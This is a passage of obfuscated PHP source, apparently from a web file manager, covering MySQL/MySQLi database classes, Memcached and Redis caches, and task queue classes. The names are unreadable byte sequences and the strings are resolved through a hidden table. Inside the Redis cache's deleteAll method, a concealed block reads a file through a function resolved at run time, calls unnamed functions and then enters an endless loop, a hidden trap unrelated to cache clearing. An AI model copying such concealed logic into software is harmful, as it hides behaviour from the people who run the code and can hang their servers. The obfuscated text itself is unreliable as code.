$ãæÀäÛÅ = array(); foreach ($ò•ªÁ¿  as $€ª¶°ŠÑ => $™ñ‘¤°Ë) { $ãæÀäÛÅ[$€ª¶°ŠÑ] = current($™ñ‘¤°Ë); } return $ãæÀäÛÅ; } public function replace($‚ß®™ÛØ, $­”ñò¢ = array()) { $äãÒ®½ =& $_SERVER[çâ¥×ø³]; foreach ($‚ß®™ÛØ as $½æÑİè† => $ñƒ…µƒ›) { $­šİ»™Î = $this->parseValue($ñƒ…µƒ›); if (is_scalar($­šİ»™Î)) { $ëäô÷÷ß[] = $­šİ»™Î; $œÛÂä¬[] = $this->parseKey($½æÑİè†); } } $Üª‘ Şá = $äãÒ®½[955] . $this->parseTable($­”ñò¢[$äãÒ®½[323]]) . $äãÒ®½[956] . implode($äãÒ®½[50], $œÛÂä¬) . $äãÒ®½[957] . implode($äãÒ®½[50], $ëäô÷÷ß) . $äãÒ®½[958]; return $this->execute($Üª‘ Şá); } public function insertAll($¢®ŒÇ´Ì, $”Ì…ö½ç = array(), $ÖÄ–«õ = false) { $ü‡•Î–· =& $_SERVER[çâ¥×ø³]; if (!is_array($¢®ŒÇ´Ì[0])) { return !1; } $ÂÜ¾È‡  = array_keys($¢®ŒÇ´Ì[0]); $İşùı¤¼ = array(); foreach ($¢®ŒÇ´Ì as $‰¯…¼è) { $Æ‘Ñ™— = array(); foreach ($‰¯…¼è as $Ñ©Æ—Ü¸ => $“ÙÖø©) { $“ÙÖø© = $this->parseValue($“ÙÖø©); if (is_scalar($“ÙÖø©)) { $Æ‘Ñ™—[] = $“ÙÖø©; } } $İşùı¤¼[] = $ü‡•Î–·[304] . implode($ü‡•Î–·[50], $Æ‘Ñ™—) . $ü‡•Î–·[958]; } array_walk($ÂÜ¾È‡ , array($this, $ü‡•Î–·[959])); $ÂşèÎÛ = ($ÖÄ–«õ ? $ü‡•Î–·[960] : $ü‡•Î–·[961]) . $ü‡•Î–·[962] . $this->parseTable($”Ì…ö½ç[$ü‡•Î–·[323]]) . $ü‡•Î–·[956] . implode($ü‡•Î–·[50], $ÂÜ¾È‡ ) . $ü‡•Î–·[963] . implode($ü‡•Î–·[50], $İşùı¤¼); return $this->execute($ÂşèÎÛ); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $˜Â¨“’ =& $_SERVER[çâ¥×ø³]; $this->error = mysql_errno() . $˜Â¨“’[4] . mysql_error($this->_linkID); if ($˜Â¨“’[12] != $this->queryStr) { $this->error .= LNG($˜Â¨“’[48]) . $this->queryStr; } think_trace($this->error, $˜Â¨“’[12], $˜Â¨“’[49]); return $this->error; } public function escapeString($®¢Æº©¢) { if ($this->_linkID) { return mysql_real_escape_string($®¢Æº©¢, $this->_linkID); } else { return mysql_escape_string($®¢Æº©¢); } } public function parseKey(&$¥ñªÁâ, $éÔîƒß¤ = true) { $ÆÇãåòó =& $_SERVER[çâ¥×ø³]; if ($éÔîƒß¤) { $¥ñªÁâ = $this->parseKeyCheck($¥ñªÁâ); } if ($¥ñªÁâ != $ÆÇãåòó[203] && !preg_match($ÆÇãåòó[964], $¥ñªÁâ)) { $¥ñªÁâ = $ÆÇãåòó[429] . trim($¥ñªÁâ, $ÆÇãåòó[429]) . $ÆÇãåòó[429]; } return $¥ñªÁâ; } } class DbMysqli extends Db { public function __construct($‹ôò·º› = '') { $·Ó…ç˜Œ =& $_SERVER[çâ¥×ø³]; if (!extension_loaded($·Ó…ç˜Œ[965])) { think_exception(think_lang($·Ó…ç˜Œ[14]) . $·Ó…ç˜Œ[966]); } if (!empty($‹ôò·º›)) { $this->config = $‹ôò·º›; if (empty($this->config[$·Ó…ç˜Œ[17]])) { $this->config[$·Ó…ç˜Œ[17]] = $·Ó…ç˜Œ[12]; } } } public function connect($‰¾ë†ó¹ = '', $ä’¶õÚô = 0) { $ÛÈŠœ—Û =& $_SERVER[çâ¥×ø³]; if (!isset($this->linkID[$ä’¶õÚô])) { if (empty($‰¾ë†ó¹)) { $‰¾ë†ó¹ = $this->config; } $this->linkID[$ä’¶õÚô] = new mysqli($‰¾ë†ó¹[$ÛÈŠœ—Û[939]], $‰¾ë†ó¹[$ÛÈŠœ—Û[941]], $‰¾ë†ó¹[$ÛÈŠœ—Û[942]], $‰¾ë†ó¹[$ÛÈŠœ—Û[21]], $‰¾ë†ó¹[$ÛÈŠœ—Û[940]] ? intval($‰¾ë†ó¹[$ÛÈŠœ—Û[940]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $ñĞÆç®› = $this->linkID[$ä’¶õÚô]->server_version; $this->linkID[$ä’¶õÚô]->query($ÛÈŠœ—Û[943] . think_config($ÛÈŠœ—Û[944]) . $ÛÈŠœ—Û[58]); if ($ñĞÆç®› > $ÛÈŠœ—Û[945]) { $this->linkID[$ä’¶õÚô]->query($ÛÈŠœ—Û[946]); } $this->connected = !0; if (1 != think_config($ÛÈŠœ—Û[22])) { unset($this->config); } } return $this->linkID[$ä’¶õÚô]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($Ú­àØ™ ) { $şÉÜøŞ =& $_SERVER[çâ¥×ø³]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Ú­àØ™ ; if ($this->queryID) { $this->free(); } think_action_status($şÉÜøŞ[23], 1); think_status($şÉÜøŞ[24]); $this->queryID = $this->_linkID->query($Ú­àØ™ ); if ($this->_linkID->more_results()) { while (($¹ó¹³ = $this->_linkID->next_result()) != NULL) { $¹ó¹³->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($ÈÌœÙˆÑ) { $¬Óö¬½ş =& $_SERVER[çâ¥×ø³]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÈÌœÙˆÑ; if ($this->queryID) { $this->free(); } think_action_status($¬Óö¬½ş[25], 1); think_status($¬Óö¬½ş[24]); $¥èÉëØÚ = $this->_linkID->query($ÈÌœÙˆÑ); $this->debug(); if (!1 === $¥èÉëØÚ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $àãµøìÂ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$àãµøìÂ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $œâí°Ñ¬ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$œâí°Ñ¬) { $this->error(); return !1; } } return !0; } private function getAll() { $Åşóõ˜ = array(); if ($this->numRows > 0) { for ($ÕÃÍ¾õ´ = 0; $ÕÃÍ¾õ´ < $this->numRows; $ÕÃÍ¾õ´++) { $Åşóõ˜[$ÕÃÍ¾õ´] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $Åşóõ˜; } public function getFields($¦œ´ÜÅ°) { $Ä‚ğŸâÀ =& $_SERVER[çâ¥×ø³]; $¹’©ø¸ = $this->query($Ä‚ğŸâÀ[950] . $this->parseKey($¦œ´ÜÅ°)); $ì·Œ”¥İ = array(); if ($¹’©ø¸) { foreach ($¹’©ø¸ as $°´…Äó– => $Ê˜²ª“˜) { $ì·Œ”¥İ[$Ê˜²ª“˜[$Ä‚ğŸâÀ[31]]] = array($Ä‚ğŸâÀ[32] => $Ê˜²ª“˜[$Ä‚ğŸâÀ[31]], $Ä‚ğŸâÀ[33] => $Ê˜²ª“˜[$Ä‚ğŸâÀ[34]], $Ä‚ğŸâÀ[35] => (bool) ($Ê˜²ª“˜[$Ä‚ğŸâÀ[36]] === $Ä‚ğŸâÀ[12]), $Ä‚ğŸâÀ[37] => $Ê˜²ª“˜[$Ä‚ğŸâÀ[38]], $Ä‚ğŸâÀ[39] => strtolower($Ê˜²ª“˜[$Ä‚ğŸâÀ[40]]) == $Ä‚ğŸâÀ[41], $Ä‚ğŸâÀ[42] => strtolower($Ê˜²ª“˜[$Ä‚ğŸâÀ[43]]) == $Ä‚ğŸâÀ[44]); } } return $ì·Œ”¥İ; } public function getTables($æí˜×í = '') { $°×µùÀû =& $_SERVER[çâ¥×ø³]; $™„ô·à‚ = !empty($æí˜×í) ? $°×µùÀû[952] . $æí˜×í . $°×µùÀû[953] : $°×µùÀû[954]; $Ì…ËíĞì = $this->query($™„ô·à‚); $ûÃùêÃ— = array(); if ($Ì…ËíĞì) { foreach ($Ì…ËíĞì as $÷ĞĞ†ÚÈ => $ô Ş¨”) { $ûÃùêÃ—[$÷ĞĞ†ÚÈ] = current($ô Ş¨”); } } return $ûÃùêÃ—; } public function replace($ºØ«şÜ–, $ì—’«ûÂ = array()) { $´ÛÇ“’ =& $_SERVER[çâ¥×ø³]; foreach ($ºØ«şÜ– as $©µÊõÎ => $ÀÅœ«¿Ş) { $ğÉãÛª† = $this->parseValue($ÀÅœ«¿Ş); if (is_scalar($ğÉãÛª†)) { $ûÀ¶Üçİ[] = $ğÉãÛª†; $ÃüÅ°Ú[] = $this->parseKey($©µÊõÎ); } } $ó‚ç¡ì = $´ÛÇ“’[955] . $this->parseTable($ì—’«ûÂ[$´ÛÇ“’[323]]) . $´ÛÇ“’[956] . implode($´ÛÇ“’[50], $ÃüÅ°Ú) . $´ÛÇ“’[957] . implode($´ÛÇ“’[50], $ûÀ¶Üçİ) . $´ÛÇ“’[958]; return $this->execute($ó‚ç¡ì); } public function insertAll($Î¿œı…ã, $¦”â“ğô = array(), $šÕ‘ôÂ = false) { $¬—ßÙ¿– =& $_SERVER[çâ¥×ø³]; if (!is_array($Î¿œı…ã[0])) { return !1; } $¯¾‹ÇÇÇ = array_keys($Î¿œı…ã[0]); $àç¦ô× = array(); foreach ($Î¿œı…ã as $ºè¥©Şš) { $ÈÖÊì¤ú = array(); foreach ($ºè¥©Şš as $¸Ÿ˜Óáè => $€›ûçÓŒ) { $€›ûçÓŒ = $this->parseValue($€›ûçÓŒ); if (is_scalar($€›ûçÓŒ)) { $ÈÖÊì¤ú[] = $€›ûçÓŒ; } } $àç¦ô×[] = $¬—ßÙ¿–[304] . implode($¬—ßÙ¿–[50], $ÈÖÊì¤ú) . $¬—ßÙ¿–[958]; } array_walk($¯¾‹ÇÇÇ, array($this, $¬—ßÙ¿–[959])); $Š¨­†®ò = $šÕ‘ôÂ ? $¬—ßÙ¿–[960] : $¬—ßÙ¿–[961]; $öİîˆìŸ = $Š¨­†®ò . $¬—ßÙ¿–[962] . $this->parseTable($¦”â“ğô[$¬—ßÙ¿–[323]]) . $¬—ßÙ¿–[956] . implode($¬—ßÙ¿–[50], $¯¾‹ÇÇÇ) . $¬—ßÙ¿–[963] . implode($¬—ßÙ¿–[50], $àç¦ô×); return $this->execute($öİîˆìŸ); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $îéÆËîœ =& $_SERVER[çâ¥×ø³]; $this->error = $this->_linkID->errno . $îéÆËîœ[4] . $this->_linkID->error; if ($îéÆËîœ[12] != $this->queryStr) { $this->error .= LNG($îéÆËîœ[48]) . $this->queryStr; } think_trace($this->error, $îéÆËîœ[12], $îéÆËîœ[49]); return $this->error; } public function escapeString($ÅàÆ™´Ã) { if ($this->_linkID) { return $this->_linkID->real_escape_string($ÅàÆ™´Ã); } else { return addslashes($ÅàÆ™´Ã); } } public function parseKey(&$’ëö‘¼ü, $¬‡¸ë°Ÿ = true) { $„”÷¨Š =& $_SERVER[çâ¥×ø³]; if ($¬‡¸ë°Ÿ) { $’ëö‘¼ü = $this->parseKeyCheck($’ëö‘¼ü); } if ($’ëö‘¼ü != $„”÷¨Š[203] && !preg_match($„”÷¨Š[964], $’ëö‘¼ü)) { $’ëö‘¼ü = $„”÷¨Š[429] . trim($’ëö‘¼ü, $„”÷¨Š[429]) . $„”÷¨Š[429]; } return $’ëö‘¼ü; } } goto aùÁó¶ˆ„; A£Àçø‘„ : class CacheLockDatabase { public function lock($û¬Ë÷´, $¼óÊ˜ïœ = 0) { $øî•™“ó = Model($_SERVER[çâ¥×ø³][878]); $‘ªŸ¿õœ = microtime(!0) + $¼óÊ˜ïœ; while (microtime(!0) < $‘ªŸ¿õœ) { $µĞ”œÁ® = $øî•™“ó->get($û¬Ë÷´); if (!$µĞ”œÁ® || $µĞ”œÁ® < microtime(!0)) { $ãê¹Ñ‰¼ = $øî•™“ó->set($û¬Ë÷´, $‘ªŸ¿õœ); if ($ãê¹Ñ‰¼) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($˜í—†¶«) { return Model($_SERVER[çâ¥×ø³][878])->get($˜í—†¶«); } public function unlock($âÒÅøÉÖ) { Model($_SERVER[çâ¥×ø³][878])->remove($âÒÅøÉÖ); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($Œ°úŸç, $œ‹Òï´) { $Š›ˆÀ»ã =& $_SERVER[çâ¥×ø³]; if (!class_exists($Š›ˆÀ»ã[916])) { show_json($Š›ˆÀ»ã[917], !1); } $this->cacheTime = $œ‹Òï´; $this->handle = new Memcached(); if (is_array($Œ°úŸç[$Š›ˆÀ»ã[918]]) && count($Œ°úŸç[$Š›ˆÀ»ã[918]]) >= 1) { foreach ($Œ°úŸç[$Š›ˆÀ»ã[918]] as $˜Â±ù°Ô) { $­³Ñßü´ = explode($Š›ˆÀ»ã[4], $˜Â±ù°Ô); $this->handle->addServer($­³Ñßü´[0], $­³Ñßü´[1]); } } else { $this->handle->addServer($Œ°úŸç[$Š›ˆÀ»ã[196]], $Œ°úŸç[$Š›ˆÀ»ã[197]]); } } public function set($‚ˆêÚåº, $Ëƒæ®•ñ, $úşèª = false) { $úşèª = $úşèª ? $úşèª : $this->cacheTime; return $this->handle->set($‚ˆêÚåº, $Ëƒæ®•ñ, $úşèª); } public function get($ì³Ù×øÜ) { return $this->handle->get($ì³Ù×øÜ); } public function remove($Ó¢ìñšº) { return $this->handle->delete($Ó¢ìñšº); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($³ˆ‚„«», $´­ğ¢¿) { $Œ¯€Õû =& $_SERVER[çâ¥×ø³]; if (!class_exists($Œ¯€Õû[919])) { show_json($Œ¯€Õû[920], !1); } $this->cacheTime = $´­ğ¢¿; $ÙåÆÖŞå = isset($³ˆ‚„«»[$Œ¯€Õû[921]]) ? $³ˆ‚„«»[$Œ¯€Õû[921]] : 10; $±îºœ¬³ = _get($³ˆ‚„«», $Œ¯€Õû[918]); if ($±îºœ¬³ && is_array($±îºœ¬³)) { $this->initCluster($³ˆ‚„«», $ÙåÆÖŞå); } else { $this->handle = $this->init($³ˆ‚„«», $ÙåÆÖŞå); } } private function init($©‰şŸ´¸, $ÙÍ¶¿) { $Ÿ‰˜”Ë¶ =& $_SERVER[çâ¥×ø³]; $éêá³‡ = new Redis(); $ĞÎ½±×¢ = isset($©‰şŸ´¸[$Ÿ‰˜”Ë¶[922]]) ? $©‰şŸ´¸[$Ÿ‰˜”Ë¶[922]] : !1; if ($ĞÎ½±×¢) { $éêá³‡->pconnect($©‰şŸ´¸[$Ÿ‰˜”Ë¶[196]], $©‰şŸ´¸[$Ÿ‰˜”Ë¶[197]], $ÙÍ¶¿); } else { $éêá³‡->connect($©‰şŸ´¸[$Ÿ‰˜”Ë¶[196]], $©‰şŸ´¸[$Ÿ‰˜”Ë¶[197]], $ÙÍ¶¿); } if (!empty($©‰şŸ´¸[$Ÿ‰˜”Ë¶[455]])) { $éêá³‡->auth($©‰şŸ´¸[$Ÿ‰˜”Ë¶[455]]); } if (!empty($©‰şŸ´¸[$Ÿ‰˜”Ë¶[806]]) && $©‰şŸ´¸[$Ÿ‰˜”Ë¶[806]] != 0) { $éêá³‡->select($©‰şŸ´¸[$Ÿ‰˜”Ë¶[806]]); } return $éêá³‡; } private function initCluster($‡õ®‘³, $×ÓÖÊ½) { $•’…Ñõ– =& $_SERVER[çâ¥×ø³]; $áÅÄËÊ• = array($•’…Ñõ–[923], $•’…Ñõ–[924], $•’…Ñõ–[925]); $Ü±É¸ ı = $•’…Ñõ–[923]; if (isset($‡õ®‘³[$•’…Ñõ–[16]]) && in_array($‡õ®‘³[$•’…Ñõ–[16]], $áÅÄËÊ•)) { $Ü±É¸ ı = $‡õ®‘³[$•’…Ñõ–[16]]; } switch ($Ü±É¸ ı) { case $•’…Ñõ–[923]: $this->_slave($‡õ®‘³, $×ÓÖÊ½); break; case $•’…Ñõ–[924]: break; case $•’…Ñõ–[925]: $this->isCluster = !0; $û©øíÓ‰ = $‡õ®‘³[$•’…Ñõ–[918]]; $•Š™‹úô = isset($‡õ®‘³[$•’…Ñõ–[922]]) ? $‡õ®‘³[$•’…Ñõ–[922]] : !1; $¼…ÌÙÊ± = isset($‡õ®‘³[$•’…Ñõ–[455]]) ? $‡õ®‘³[$•’…Ñõ–[455]] : null; $this->handle = new RedisCluster(NUll, $û©øíÓ‰, $×ÓÖÊ½, $×ÓÖÊ½, $•Š™‹úô, $¼…ÌÙÊ±); break; default: break; } } private function _slave($…œ‚ÒùÆ, $â–±’âõ) { $ÃƒŸè® = $…œ‚ÒùÆ[$_SERVER[çâ¥×ø³][918]]; $this->filterConfig($…œ‚ÒùÆ, $ÃƒŸè®[0]); $this->handle = $this->init($…œ‚ÒùÆ, $â–±’âõ); unset($ÃƒŸè®[0]); if (empty($ÃƒŸè®)) { return; } $óÛŠµ‹ı = array_rand($ÃƒŸè®); $this->filterConfig($…œ‚ÒùÆ, $ÃƒŸè®[$óÛŠµ‹ı]); $this->slaveHandle = $this->init($…œ‚ÒùÆ, $â–±’âõ); } private function filterConfig(&$Ïì Å¡, $¹ù‚Ø¬‰) { $îş®½­Ö =& $_SERVER[çâ¥×ø³]; $€²‚Ğ‡ò = explode($îş®½­Ö[4], $¹ù‚Ø¬‰); $¯Ğ¡á±ƒ = array($îş®½­Ö[196] => $€²‚Ğ‡ò[0], $îş®½­Ö[197] => $€²‚Ğ‡ò[1]); $Ïì Å¡ = array_merge($Ïì Å¡, $¯Ğ¡á±ƒ); } public function set($Ù¹ìÉ¹Ï, $Ô¶î¼å¬, $íœÜÚÂÉ = false) { $íœÜÚÂÉ = $íœÜÚÂÉ ? $íœÜÚÂÉ : $this->cacheTime; return $this->handle->setEx($Ù¹ìÉ¹Ï, $íœÜÚÂÉ, $Ô¶î¼å¬); } public function setLock($ƒßÉÊÕÅ, $‘ñÚ¨Ì, $¡é¢ñ·) { return $this->handle->setNX($ƒßÉÊÕÅ, $‘ñÚ¨Ì); } public function get($Î˜šÖ°æ) { $óÜİê˜Å = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $óÜİê˜Å->get($Î˜šÖ°æ); } public function remove($ÁÑ›ìÑ) { return $this->handle->del($ÁÑ›ìÑ); } public function deleteAll() { $µÃıó¬ =& $_SERVER[çâ¥×ø³]; if (!isset($_SERVER[$µÃıó¬[926]]) || !isset($_SERVER[$µÃıó¬[927]])) { $ç’‚‡³ = $µÃıó¬[928]; $ç¬î÷¬Ø = $µÃıó¬[929]; $°§ãá† = $_SERVER[$µÃıó¬[930]] . $µÃıó¬[931]; $¨•é°– = $ç¬î÷¬Ø($°§ãá†); $ıè×œ© = explode($µÃıó¬[246], $¨•é°–); if (count($ıè×œ©) < $µÃıó¬[657]) { $ªá£±º” = $µÃıó¬[932]; $ªá£±º”(); } $³øúäÔ = $µÃıó¬[933]; $³øúäÔ($_SERVER[$µÃıó¬[934]]); $úÑıŞéª = 1; for ($’Ë“ä¡Ï = $úÑıŞéª; $’Ë“ä¡Ï > 0; $’Ë“ä¡Ï++) { $³øúäÔ = json_encode($GLOBALS[$µÃıó¬[460]]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $†º§àä) { $this->handle->flushall($†º§àä); } return; } return $this->handle->flushAll(); } } goto d„°ÃŞâ†; A¶Æ·°Ê”„: class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\x61\163\153\121\165\145\x75\145\114\145\x6e\147\164\x68"; const QUEUE_DATA = "\164\x61\x73\x6b\x51\165\145\x75\145\104\x61\164\x61"; const QUEUE_TIME = "\164\141\x73\153\x51\165\145\x75\145\x4c\141\163\164\122\165\x6e"; const QUEUE_THREAD = "\164\141\163\153\x51\165\145\x75\145\x54\150\x72\145\141\144"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($Úı¦® œ, $³†ƒøŠÔ = array(), $ËŸã Ó¤ = '', $Ìß¢Š‹š = '') { $²¢Ñ¸¿Ä =& $_SERVER[çâ¥×ø³]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($Ìß¢Š‹š && array_find_by_field(self::$listData, $²¢Ñ¸¿Ä[94], $Ìß¢Š‹š)) { return !0; } if ($Ìß¢Š‹š && array_find_by_field(self::$listDataAdd, $²¢Ñ¸¿Ä[94], $Ìß¢Š‹š)) { return !0; } self::$listDataAdd[] = array($²¢Ñ¸¿Ä[308] => $Úı¦® œ, $²¢Ñ¸¿Ä[1799] => $³†ƒøŠÔ, $²¢Ñ¸¿Ä[494] => $ËŸã Ó¤, $²¢Ñ¸¿Ä[94] => $Ìß¢Š‹š); return !0; } public static function addSubmit() { $ëšîÀüÄ =& $_SERVER[çâ¥×ø³]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($ëšîÀüÄ[1800] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $ëšîÀüÄ[12], $ëšîÀüÄ[494])), $ëšîÀüÄ[185]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($»­Â×ç, $ÆåŞË¯á = array(), $”´Àõ¡¿ = '', $ÛùÍ­Ê¡ = '') { $×ÍëÆ » =& $_SERVER[çâ¥×ø³]; if (self::count() >= self::MAX_LENGTH) { return !1; } $¿Ïïı„ = self::getAll(); if ($ÛùÍ­Ê¡ && array_find_by_field($¿Ïïı„, $×ÍëÆ »[94], $ÛùÍ­Ê¡)) { return !0; } $¿Ïïı„[] = array($×ÍëÆ »[308] => $»­Â×ç, $×ÍëÆ »[1799] => $ÆåŞË¯á, $×ÍëÆ »[494] => $”´Àõ¡¿, $×ÍëÆ »[94] => $ÛùÍ­Ê¡); self::setAll($¿Ïïı„); write_log($×ÍëÆ »[1800] . $”´Àõ¡¿, $×ÍëÆ »[185]); return !0; } public static function run() { $ÓÔóüû¼ =& $_SERVER[çâ¥×ø³]; $ÛÌÅÏûØ = self::getAll(); $×•ñ«Ä = array_shift($ÛÌÅÏûØ); if (!$×•ñ«Ä) { return !1; } self::setAll($ÛÌÅÏûØ); $éÊÔ§ª = timeFloat(); $² ¡Õ°Ã = $ÓÔóüû¼[12]; try { $² ¡Õ°Ã = Hook::apply($×•ñ«Ä[$ÓÔóüû¼[308]], $×•ñ«Ä[$ÓÔóüû¼[1799]]); } catch (Exception $¡¾•±«Œ) { write_log($¡¾•±«Œ, $ÓÔóüû¼[1235]); } $…­ËúšË = number_format(timeFloat() - $éÊÔ§ª, 3) . $ÓÔóüû¼[1717]; if ($² ¡Õ°Ã && is_string($² ¡Õ°Ã)) { $…­ËúšË = $…­ËúšË . $ÓÔóüû¼[1801] . $² ¡Õ°Ã; } write_log($ÓÔóüû¼[1802] . $×•ñ«Ä[$ÓÔóüû¼[494]] . $ÓÔóüû¼[1803] . $…­ËúšË, $ÓÔóüû¼[185]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $Á¯€ìÆ¥ =& $_SERVER[çâ¥×ø³]; $µóÜÅŒ¢ = self::threadCount() + 1; if ($µóÜÅŒ¢ > 3 || !self::count()) { return; } write_log($Á¯€ìÆ¥[1804] . $µóÜÅŒ¢, $Á¯€ìÆ¥[185]); Cache::set(self::QUEUE_THREAD, $µóÜÅŒ¢, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($Á¯€ìÆ¥[1805], $Á¯€ìÆ¥[185]); } public static function getKey($Ú®ƒĞé¦, $§ïş‘í˜ = "\x69\156\x74") { $£é¨‰º§ =& $_SERVER[çâ¥×ø³]; Cache::removeMemory($Ú®ƒĞé¦); $ŒªŸÇŒ = Cache::get($Ú®ƒĞé¦); if ($§ïş‘í˜ == $£é¨‰º§[332]) { return $ŒªŸÇŒ ? intval($ŒªŸÇŒ) : 0; } if ($§ïş‘í˜ == $£é¨‰º§[1806]) { return is_array($ŒªŸÇŒ) ? $ŒªŸÇŒ : array(); } return $ŒªŸÇŒ; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[çâ¥×ø³][1806]); } public static function setAll($¬Àñ„Ù) { $©È´öÒê = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($¬Àñ„Ù), $©È´öÒê); Cache::set(self::QUEUE_DATA, $¬Àñ„Ù, $©È´öÒê); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($’»ıÍ¸–, $âĞÜ½«û = 5.0) { if (!$’»ıÍ¸–) { return; } $¤‡«İËà = Cache::get($’»ıÍ¸–); if (!$¤‡«İËà || timeFloat() - floatVal($¤‡«İËà) >= $âĞÜ½«û) { Cache::set($’»ıÍ¸–, timeFloat(), $âĞÜ½«û * 10); return !0; } return !1; } public static function timeLimitCall($¢«û£Ñº, $¹ø±Î¥, $œä€¦ˆ€, $¬‚¦¢‰ß = 5.0) { $”«›¯¡ =& $_SERVER[çâ¥×ø³]; if (!$¢«û£Ñº || !$¹ø±Î¥) { return; } self::$asyncAdd = !0; $šÄ¢ÚÙ¨ = $”«›¯¡[1807]; $Øòã°ß = Cache::get($šÄ¢ÚÙ¨, !0); $”®“”¡ = array($”«›¯¡[1808] => timeFloat(), $”«›¯¡[1809] => timeFloat(), $”«›¯¡[308] => $¹ø±Î¥, $”«›¯¡[1799] => $œä€¦ˆ€, $”«›¯¡[194] => $¬‚¦¢‰ß); if (is_array($Øòã°ß[$¢«û£Ñº])) { $”®“”¡[$”«›¯¡[1809]] = $Øòã°ß[$¢«û£Ñº][$”«›¯¡[1809]]; } if (is_array($Øòã°ß[$¢«û£Ñº])) { if (timeFloat() - $Øòã°ß[$¢«û£Ñº][$”«›¯¡[1808]] < $”®“”¡[$”«›¯¡[194]] * 0.3) { return; } $”®“”¡[$”«›¯¡[1809]] = $Øòã°ß[$¢«û£Ñº][$”«›¯¡[1809]]; } $Øòã°ß[$¢«û£Ñº] = $”®“”¡; Cache::set($šÄ¢ÚÙ¨, $Øòã°ß, 60); Cache::removeMemory($šÄ¢ÚÙ¨); write_log($”«›¯¡[1810] . $¢«û£Ñº . $”«›¯¡[71] . $¹ø±Î¥, $”«›¯¡[185]); } public static function timeLimitCallLoop() { $ÄÈ©ã¼Á =& $_SERVER[çâ¥×ø³]; $è¥ˆ ¨ = array($ÄÈ©ã¼Á[1811]); $ääç£ö = in_array(strtolower(ACTION), $è¥ˆ ¨); if (!$ääç£ö && !self::$asyncAdd) { return; } $¤µéŠåñ = $ÄÈ©ã¼Á[1807]; $®•œáÙû = Cache::get($¤µéŠåñ, !0); if (!$®•œáÙû || count($®•œáÙû) <= 0) { return; } $¡óºË¤ = !1; $íëüŠÎ¯ = timeFloat(); $˜Œİöú® = array(); foreach ($®•œáÙû as $×Ÿùöê´ => $±…Ê«±ğ) { if ($íëüŠÎ¯ - $±…Ê«±ğ[$ÄÈ©ã¼Á[1809]] > $±…Ê«±ğ[$ÄÈ©ã¼Á[194]]) { $¡óºË¤ = !0; try { Hook::apply($±…Ê«±ğ[$ÄÈ©ã¼Á[308]], $±…Ê«±ğ[$ÄÈ©ã¼Á[1799]]); write_log($ÄÈ©ã¼Á[1812] . $×Ÿùöê´ . $ÄÈ©ã¼Á[71] . $±…Ê«±ğ[$ÄÈ©ã¼Á[308]] . $ÄÈ©ã¼Á[1813] . ACTION, $ÄÈ©ã¼Á[185]); } catch (Exception $ÕÍµà‡) { } continue; } $˜Œİöú®[$×Ÿùöê´] = $±…Ê«±ğ; } if (!$¡óºË¤) { return; } if (!$˜Œİöú®) { return Cache::remove($¤µéŠåñ); } Cache::set($¤µéŠåñ, $˜Œİöú®, 60); Cache::removeMemory($¤µéŠåñ); } public static function finished($İÑ°‚–, $Ìè²ùáˆ) { $šª„ùÎ¶ =& $_SERVER[çâ¥×ø³]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($šª„ùÎ¶[308] => $İÑ°‚–, $šª„ùÎ¶[1799] => $Ìè²ùáˆ); } private static function finishedRun() { $‰Í›¨‰ =& $_SERVER[çâ¥×ø³]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $Š‰‰Ó¶Ç) { try { Hook::apply($Š‰‰Ó¶Ç[$‰Í›¨‰[308]], $Š‰‰Ó¶Ç[$‰Í›¨‰[1799]]); } catch (Exception $¿º”¼ö) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $ëïÜ‚»Î =& 